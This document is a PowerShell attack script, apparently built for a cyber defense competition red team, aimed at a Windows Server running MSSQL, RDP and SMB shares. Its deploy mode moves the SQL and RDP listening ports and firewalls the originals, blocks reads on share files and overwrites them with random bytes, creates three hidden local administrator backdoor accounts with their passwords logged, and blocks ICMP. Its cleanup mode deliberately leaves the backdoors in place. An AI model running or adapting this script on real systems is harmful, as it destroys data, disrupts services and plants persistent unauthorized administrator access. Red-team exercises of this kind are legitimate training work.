#Requires -RunAsAdministrator
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Nov 21 2026 -- Windows Server 2019 MSSQL Disruption
# Target: 172.20.240.120 (MSSQL :1433, RDP :3389, SMB SOP files scored)
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
#
# New angles vs prior practices (services STAY UP, configs are broken):
#
#   Phase A -- SQL Port Relocation  : SQL Server moves from 1433 → 14330 via
#              registry; firewall blocks 1433; service restarts on new port.
#              BREAKS: scoring probe connects to 1433, gets "refused" while
#              sqlservr.exe is happily running on 14330.
#
#   Phase B -- RDP Port Relocation  : TermService moves from 3389 → 33890 via
#              registry; firewall blocks 3389; TermService restarts.
#              BREAKS: scoring probe connects to 3389, gets "refused" while
#              TermService is running on 33890.
#
#   Phase C -- SMB SOP File Lockout : SMB service stays up; share stays up;
#              NTFS ACLs on the SOP share content deny read to Everyone.
#              File content overwritten with random bytes as a second layer.
#              BREAKS: scoring probe connects to share, sees files, but gets
#              "access denied" on every read.
#
#   Phase D -- Hidden Backdoor Accts: 3 local admins hidden from login screen
#              via SpecialAccounts\UserList for persistent red team access.
#
#   Phase E -- ICMP Block           : Windows Firewall rule drops all inbound
#              ICMPv4/ICMPv6 echo requests.
#              BREAKS: MSSQL-ping scoring check.
#
# Usage:
#   .\02_disrupt_mssql.ps1 deploy
#   .\02_disrupt_mssql.ps1 cleanup   (restores A/B/C; leaves D for manual cleanup)
#
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

param([Parameter(Position=0)][string]$Mode = "deploy")

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }

$StateDir   = "C:\Windows\System32\spool\drivers\color"
$StateFile  = "$StateDir\.rt21-mssql.json"
$NewSqlPort = "14330"
$NewRdpPort = 33890
$FwSqlRule    = "rt-MSSQL-1433-blk"
$FwRdpRule    = "rt-RDP-3389-blk"
$FwIcmpRule   = "rt-ICMPv4-blk"
$FwIcmpv6Rule = "rt-ICMPv6-blk"

Write-Host ""
Write-Host " ///////////////////////////////////////////////////////\" -ForegroundColor DarkRed
Write-Host "   Nov 21 2026 -- MSSQL Disruption (port relocation)"    -ForegroundColor Yellow
Write-Host "   SQL port move | RDP port move | SOP lockout | Backdoors" -ForegroundColor Yellow
Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\" -ForegroundColor DarkRed
Write-Host ""

switch ($Mode.ToLower()) {

# =============================================================================
# DEPLOY
# =============================================================================
"deploy" {

    New-Item -Path $StateDir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
    $state = @{ deployed_at = (Get-Date -Format "o") }

    # -------------------------------------------------------------------------
    # PHASE A: SQL SERVER PORT RELOCATION
    # Moves SQL Server's TCP listener from 1433 to 14330 via registry.
    # Service restart required; firewall blocks original port.
    # -------------------------------------------------------------------------
    Write-Section "A / SQL Server Port Relocation"

    # Find the SQL Server instance key (MSSQL15 for 2019, MSSQL14 for 2017, etc.)
    $sqlInstKey = $null
    try {
        $sqlInstKey = Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
            Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
            Select-Object -First 1 -ExpandProperty PSChildName
    } catch {}

    if ($sqlInstKey) {
        $tcpPath = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$sqlInstKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
        $state["sql_inst_key"] = $sqlInstKey

        if (Test-Path $tcpPath) {
            try {
                $origPort = (Get-ItemProperty $tcpPath -Name TcpPort -ErrorAction SilentlyContinue).TcpPort
                $state["original_sql_port"] = $origPort
                Set-ItemProperty $tcpPath -Name TcpPort -Value $NewSqlPort -Force
                Set-ItemProperty $tcpPath -Name TcpDynamicPorts -Value "" -Force
                Write-Success "SQL TcpPort: $origPort → $NewSqlPort (registry updated)"
            } catch { Write-Warn "SQL port registry change failed: $_" }
        } else {
            Write-Warn "TCP config path not found: $tcpPath"
        }

        # Restart SQL Server service to apply port change
        try {
            Restart-Service MSSQLSERVER -Force -ErrorAction Stop
            Write-Success "SQL Server service restarted -- now listening on $NewSqlPort"
        } catch { Write-Warn "MSSQLSERVER restart failed: $_" }
    } else {
        Write-Warn "Could not find SQL Server instance key -- skipping port change"
    }

    # Block original port at firewall regardless of service restart success
    try {
        New-NetFirewallRule -DisplayName $FwSqlRule -Direction Inbound `
            -Protocol TCP -LocalPort 1433 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "Firewall: TCP 1433 blocked inbound"
    } catch { Write-Warn "SQL firewall rule: $_" }

    # -------------------------------------------------------------------------
    # PHASE B: RDP PORT RELOCATION
    # Moves RDP listener from 3389 to 33890 via registry.
    # TermService restarts; firewall blocks original port.
    # -------------------------------------------------------------------------
    Write-Section "B / RDP Port Relocation"

    $rdpPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
    try {
        $origRdpPort = (Get-ItemProperty $rdpPath -Name PortNumber -ErrorAction Stop).PortNumber
        $state["original_rdp_port"] = $origRdpPort
        Set-ItemProperty $rdpPath -Name PortNumber -Value $NewRdpPort -Type DWord -Force
        Write-Success "RDP PortNumber: $origRdpPort → $NewRdpPort (registry updated)"
    } catch { Write-Warn "RDP port registry change failed: $_" }

    try {
        Restart-Service TermService -Force -ErrorAction Stop
        Write-Success "TermService restarted -- RDP now on $NewRdpPort"
    } catch { Write-Warn "TermService restart failed: $_" }

    try {
        New-NetFirewallRule -DisplayName $FwRdpRule -Direction Inbound `
            -Protocol TCP -LocalPort 3389 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "Firewall: TCP 3389 blocked inbound"
    } catch { Write-Warn "RDP firewall rule: $_" }

    # -------------------------------------------------------------------------
    # PHASE C: SMB SOP FILE LOCKOUT
    # SMB and LanmanServer stay running.  NTFS ACLs on the SOP share content
    # deny read to Everyone.  File content is overwritten with random bytes.
    # Backups stored in state dir for cleanup.
    # -------------------------------------------------------------------------
    Write-Section "C / SMB SOP File Lockout"

    $sopShares = Get-SmbShare -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notin @('ADMIN$','C$','IPC$','print$','SYSVOL','NETLOGON') }

    $state["sop_files_backed_up"] = @()
    $state["sop_dirs_acl_locked"] = @()
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()

    foreach ($share in $sopShares) {
        $sharePath = $share.Path
        if (-not (Test-Path $sharePath)) { continue }

        Write-Info "Processing SOP share: \\$($env:COMPUTERNAME)\$($share.Name) → $sharePath"

        # Deny Everyone read on the share root (inherits to children)
        try {
            $acl  = Get-Acl $sharePath
            $deny = New-Object System.Security.AccessControl.FileSystemAccessRule(
                "Everyone",
                [System.Security.AccessControl.FileSystemRights]::ReadData,
                [System.Security.AccessControl.InheritanceFlags]"ContainerInherit,ObjectInherit",
                [System.Security.AccessControl.PropagationFlags]::None,
                [System.Security.AccessControl.AccessControlType]::Deny
            )
            $acl.AddAccessRule($deny)
            Set-Acl -Path $sharePath -AclObject $acl -ErrorAction Stop
            $state["sop_dirs_acl_locked"] += $sharePath
            Write-Success "  ACL: Everyone:Read DENIED on $sharePath"
        } catch { Write-Warn "  ACL deny failed on $sharePath : $_" }

        # Overwrite file content with random bytes; save originals
        Get-ChildItem $sharePath -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $bkName = "sop_bk_" + [System.IO.Path]::GetFileNameWithoutExtension($_.Name) +
                          "_" + [System.IO.Path]::GetExtension($_.Name).TrimStart('.') + ".bin"
                $bkPath = "$StateDir\$bkName"
                Copy-Item $_.FullName $bkPath -Force -ErrorAction Stop

                $bytes = New-Object byte[] $_.Length
                $rng.GetBytes($bytes)
                [System.IO.File]::WriteAllBytes($_.FullName, $bytes)

                $state["sop_files_backed_up"] += @{ Original = $_.FullName; Backup = $bkPath }
                Write-Success "  Corrupted: $($_.Name) (backup: $bkName)"
            } catch { Write-Warn "  File corrupt failed on $($_.FullName): $_" }
        }
    }

    if ($sopShares.Count -eq 0) {
        Write-Warn "No non-admin SMB shares found -- SOP phase skipped"
    }

    # -------------------------------------------------------------------------
    # PHASE D: HIDDEN BACKDOOR ACCOUNTS
    # 3 local admins, hidden from Windows login screen via SpecialAccounts.
    # -------------------------------------------------------------------------
    Write-Section "D / Hidden Backdoor Accounts"

    $state["backdoor_users"] = @()
    $rng2 = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
    $sacKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

    for ($i = 0; $i -lt 3; $i++) {
        $hexBuf = New-Object byte[] 4
        $rng2.GetBytes($hexBuf)
        $uname = "rt_" + (($hexBuf | ForEach-Object { $_.ToString('x2') }) -join '')

        # Generate password: upper + lower + digit + special + 10 random chars
        $pwChars = "ABCDEFGHJKLMNPQRSTUVWXYZ"[0..22] +
                   "abcdefghjkmnpqrstuvwxyz"[0..21] +
                   "23456789" + "!@#$%^&*()"
        $pwBuf = New-Object byte[] 14
        $rng2.GetBytes($pwBuf)
        $pw = -join ($pwBuf | ForEach-Object { $pwChars[$_ % $pwChars.Length] })

        try {
            $secPw = ConvertTo-SecureString $pw -AsPlainText -Force
            New-LocalUser -Name $uname -Password $secPw -PasswordNeverExpires $true `
                -UserMayNotChangePassword $true -ErrorAction Stop | Out-Null
            Add-LocalGroupMember -Group "Administrators" -Member $uname -ErrorAction Stop

            # Hide from login screen
            if (-not (Test-Path $sacKey)) {
                New-Item $sacKey -Force | Out-Null
            }
            Set-ItemProperty $sacKey -Name $uname -Value 0 -Type DWord -Force

            Write-Success "Created: $uname  pw: $pw"
            $state["backdoor_users"] += @{ Username = $uname; Password = $pw }
        } catch { Write-Warn "Account create failed for $uname : $_" }
    }

    # Save state
    try {
        $state | ConvertTo-Json -Depth 5 | Set-Content -Path $StateFile -Encoding UTF8
        Write-Success "State saved to $StateFile"
    } catch { Write-Warn "State save failed: $_" }

    # -------------------------------------------------------------------------
    # PHASE E: ICMP BLOCK -- 3 layers
    # Layer 1: our explicit DROP rules
    # Layer 2: disable built-in Core Networking ICMP allow rules so removing
    #          our rule doesn't restore the default
    # Layer 3: registry -- EnableICMPRedirect = 0
    # -------------------------------------------------------------------------
    Write-Section "E / ICMP Block (3 layers)"

    # Layer 1 — explicit deny rules
    try {
        New-NetFirewallRule -DisplayName $FwIcmpRule -Direction Inbound `
            -Protocol ICMPv4 -IcmpType 8 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "L1: ICMPv4 echo-request (type 8) blocked"
    } catch { Write-Warn "ICMPv4 firewall rule: $_" }

    try {
        New-NetFirewallRule -DisplayName $FwIcmpv6Rule -Direction Inbound `
            -Protocol ICMPv6 -IcmpType 128 -Action Block -ErrorAction Stop | Out-Null
        Write-Success "L1: ICMPv6 echo-request (type 128) blocked"
    } catch { Write-Warn "ICMPv6 firewall rule: $_" }

    # Layer 2 — disable built-in ICMP allow rules
    try {
        $disabledRules = @()
        Get-NetFirewallRule -ErrorAction SilentlyContinue |
            Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and $_.Enabled -eq "True" -and
                           ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
            ForEach-Object {
                $_ | Disable-NetFirewallRule -ErrorAction SilentlyContinue
                $disabledRules += $_.Name
                Write-Success "L2: disabled built-in rule: $($_.DisplayName)"
            }
        Write-Info "L2: $($disabledRules.Count) built-in ICMP allow rule(s) disabled"
    } catch { Write-Warn "L2 built-in ICMP disable: $_" }

    # Layer 3 — registry knob
    try {
        $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        Set-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -Value 0 -Type DWord -Force
        Set-ItemProperty $tcpipParams -Name "EnableDeadGWDetect" -Value 0 -Type DWord -Force
        Write-Success "L3: EnableICMPRedirect + EnableDeadGWDetect = 0 (registry)"
    } catch { Write-Warn "L3 registry ICMP: $_" }

    Write-Host ""
    Write-Host " -- Summary -------------------------------------------" -ForegroundColor Green
    Write-Host "   A: SQL Server port 1433 → $NewSqlPort, 1433 firewall blocked" -ForegroundColor Gray
    Write-Host "   B: RDP port 3389 → $NewRdpPort, 3389 firewall blocked" -ForegroundColor Gray
    Write-Host "   C: SOP share files corrupted, Everyone:Read denied"    -ForegroundColor Gray
    Write-Host "   D: 3 hidden local admins created (see state file)"     -ForegroundColor Gray
    Write-Host "   E: ICMP echo blocked (3 layers -- rule + built-ins disabled + registry)" -ForegroundColor Gray
    Write-Host " -- State file: $StateFile" -ForegroundColor Gray
    Write-Host " -------------------------------------------------------" -ForegroundColor Green
}

# =============================================================================
# CLEANUP  (restores A/B/C; backdoor accounts are intentionally left)
# =============================================================================
"cleanup" {

    $state = $null
    if (Test-Path $StateFile) {
        try {
            $state = Get-Content $StateFile -Raw -Encoding UTF8 | ConvertFrom-Json
            Write-Info "State loaded"
        } catch { Write-Warn "State parse failed" }
    } else {
        Write-Warn "State file not found -- attempting blind cleanup"
    }

    # Phase E cleanup: remove ICMP block (reverse all 3 layers)
    Write-Section "E / Remove ICMP Block"
    try {
        Remove-NetFirewallRule -DisplayName $FwIcmpRule   -ErrorAction SilentlyContinue
        Remove-NetFirewallRule -DisplayName $FwIcmpv6Rule -ErrorAction SilentlyContinue
        Write-Success "L1: ICMP block rules removed"
    } catch {}
    try {
        Get-NetFirewallRule -ErrorAction SilentlyContinue |
            Where-Object { $_.Direction -eq "Inbound" -and $_.Action -eq "Allow" -and $_.Enabled -eq "False" -and
                           ($_.DisplayName -match "ICMP|Ping" -or $_.Name -match "CoreNet.*ICMP") } |
            ForEach-Object { $_ | Enable-NetFirewallRule -ErrorAction SilentlyContinue }
        Write-Success "L2: built-in ICMP allow rules re-enabled"
    } catch {}
    try {
        $tcpipParams = "HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"
        Remove-ItemProperty $tcpipParams -Name "EnableICMPRedirect" -ErrorAction SilentlyContinue
        Remove-ItemProperty $tcpipParams -Name "EnableDeadGWDetect"  -ErrorAction SilentlyContinue
        Write-Success "L3: registry ICMP keys removed"
    } catch {}

    # Phase C cleanup: restore SMB files and ACLs
    Write-Section "C / Restore SOP Files + ACLs"

    if ($state -and $state.sop_files_backed_up) {
        foreach ($entry in $state.sop_files_backed_up) {
            try {
                Copy-Item $entry.Backup $entry.Original -Force -ErrorAction Stop
                Remove-Item $entry.Backup -Force -ErrorAction SilentlyContinue
                Write-Success "Restored: $($entry.Original)"
            } catch { Write-Warn "Restore failed for $($entry.Original): $_" }
        }
    }

    if ($state -and $state.sop_dirs_acl_locked) {
        foreach ($dir in $state.sop_dirs_acl_locked) {
            try {
                $acl = Get-Acl $dir
                $acl.Access |
                    Where-Object { $_.IdentityReference -eq "Everyone" -and
                                   $_.AccessControlType -eq "Deny" } |
                    ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
                Set-Acl $dir $acl
                Write-Success "ACL deny removed: $dir"
            } catch { Write-Warn "ACL restore failed on $dir : $_" }
        }
    }

    # Phase B cleanup: restore RDP port
    Write-Section "B / Restore RDP Port"
    try {
        $rdpPath    = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"
        $restorePort = if ($state -and $state.original_rdp_port) { $state.original_rdp_port } else { 3389 }
        Set-ItemProperty $rdpPath -Name PortNumber -Value $restorePort -Type DWord -Force
        Restart-Service TermService -Force -ErrorAction SilentlyContinue
        Write-Success "RDP port restored to $restorePort"
    } catch { Write-Warn "RDP port restore failed: $_" }

    try {
        Remove-NetFirewallRule -DisplayName $FwRdpRule -ErrorAction SilentlyContinue
        Write-Success "RDP firewall rule removed"
    } catch {}

    # Phase A cleanup: restore SQL port
    Write-Section "A / Restore SQL Server Port"
    try {
        $instKey = if ($state -and $state.sql_inst_key) { $state.sql_inst_key } else {
            Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server" -ErrorAction SilentlyContinue |
                Where-Object { $_.PSChildName -match "^MSSQL\d+" } |
                Select-Object -First 1 -ExpandProperty PSChildName
        }
        if ($instKey) {
            $tcpPath    = "HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server\$instKey\MSSQLServer\SuperSocketNetLib\Tcp\IPAll"
            $restorePort = if ($state -and $state.original_sql_port) { $state.original_sql_port } else { "1433" }
            Set-ItemProperty $tcpPath -Name TcpPort -Value $restorePort -Force
            Restart-Service MSSQLSERVER -Force -ErrorAction SilentlyContinue
            Write-Success "SQL Server port restored to $restorePort, service restarted"
        }
    } catch { Write-Warn "SQL port restore failed: $_" }

    try {
        Remove-NetFirewallRule -DisplayName $FwSqlRule -ErrorAction SilentlyContinue
        Write-Success "SQL firewall rule removed"
    } catch {}

    Remove-Item $StateFile -Force -ErrorAction SilentlyContinue
    Write-Success "Cleanup complete (backdoor accounts NOT removed -- clean those manually)"
}

default {
    Write-Err "Usage: .\02_disrupt_mssql.ps1 [deploy|cleanup]"
    exit 1
}

}
